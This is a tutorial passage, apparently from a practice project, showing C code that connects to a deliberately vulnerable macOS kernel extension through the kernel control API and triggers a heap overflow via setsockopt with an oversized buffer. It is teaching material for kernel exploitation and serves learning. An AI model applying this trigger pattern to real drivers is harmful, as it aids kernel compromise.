# Lets now trigger a heap overflow

- The vulnerable kext uses `kernel control API`. The kernel control API is a bidirectional communication mechanism between a user space application and a KEXT.
- XNU defines `PF_SYSTEM` domain to provide a way for applications to configure and control KEXTs.
- The `PF_SYSTEM` domain, in turn, supports two protocols, `SYSPROTO_CONTROL` and `SYSPROTO_EVENT`.

We use PF_SYSTEM and SYSPROTO_CONTROL to connect to the vulnerable kext. 
`int sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);`

We need the control id of the kext assigned by the kernel. We can fetch it using ioctl on the `sock`

```
	struct ctl_info info;
	memset(&info, 0, sizeof(info));
	strncpy(info.ctl_name, CONTROL_NAME, sizeof(info.ctl_name));

	int err = ioctl(sock, CTLIOCGINFO, &info);
    if (err)
	{
		perror("Could not get ID for kernel control.\n");
		exit(-1);
	}

```

We use the `info.ctl_id` kernel control id and create a `struct sockaddr_ctl` and connect to the sock:

```
	struct sockaddr_ctl addr;
	
	addr.sc_len 	= sizeof(addr);
	addr.sc_family  = AF_SYSTEM;
	addr.ss_sysaddr = AF_SYS_CONTROL;
	addr.sc_id 		= info.ctl_id;
	addr.sc_unit 	= 0; /* allocate dynamically */

	int err = connect(sock, (struct sockaddr*) &addr, sizeof(addr));
```

We can now trigger one of the defined vulnerabilitiesby  calling `setsockopt` on the above `sock`
```int setsockopt(int socket, int level, int option_name, const void *option_value, socklen_t option_len);```


Example to trigger heap overflow, we set the opt to HEAP_OVERFLOW, pass in the user data to kernel inside data

~~~
size_t size = 1024;
char address[size];

memset(address, 0x42, size);

setsockopt(ctrl, SYSPROTO_CONTROL, HEAP_OVERFLOW, address, size);
~~~

Complete code is available at: https://github.com/ant4g0nist/Vulnerable-Kext/tree/main/client/
